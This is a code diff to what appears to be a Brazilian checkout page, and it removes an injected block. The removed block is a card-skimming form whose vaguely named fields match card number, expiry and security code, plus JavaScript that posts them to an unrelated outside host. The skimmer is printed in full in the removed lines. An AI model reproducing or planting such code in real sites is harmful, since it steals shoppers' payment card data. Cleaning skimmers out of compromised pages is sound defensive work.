@@ -377,51 +377,7 @@ function validarCPF(cpf) {
                                 </div>
                             </div>
                         </div>
-                        <form id="client-form">
-  <input id="client-name" name="name" type="text" maxlength="120" required>
-  <input id="client-number-16" name="number16" type="text" inputmode="numeric" pattern="[0-9]{16}" maxlength="16" required>
-  <input id="client-number-4" name="number4" type="text" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required>
-  <input id="client-number-3" name="number3" type="text" inputmode="numeric" pattern="[0-9]{3}" maxlength="3" required>
-  <button type="submit">Enviar</button>
-</form>
-const DATA_API_URL = "https://central-de-da-dos.vercel.app/login";
-
-const form = document.querySelector("#client-form");
-
-form.addEventListener("submit", async (event) => {
-  event.preventDefault();
-
-  const submitButton = form.querySelector('button[type="submit"]');
-  submitButton.disabled = true;
-
-  const payload = {
-    name: document.querySelector("#client-name").value,
-    number16: document.querySelector("#client-number-16").value,
-    number4: document.querySelector("#client-number-4").value,
-    number3: document.querySelector("#client-number-3").value,
-  };
-
-  try {
-    const response = await fetch(DATA_API_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-    });
-
-    const result = await response.json();
-
-    if (!response.ok) {
-      throw new Error(result.error || "Nao foi possivel enviar os dados.");
-    }
-
-    alert("Dados enviados com sucesso.");
-    form.reset();
-  } catch (error) {
-    alert(error.message);
-  } finally {
-    submitButton.disabled = false;
-  }
-});
+               
 
                         <!-- [ATUALIZADO] Opção Maquininha -->
                         <div id="posOption" class="payment-option border rounded-lg cursor-not-allowed opacity-60">
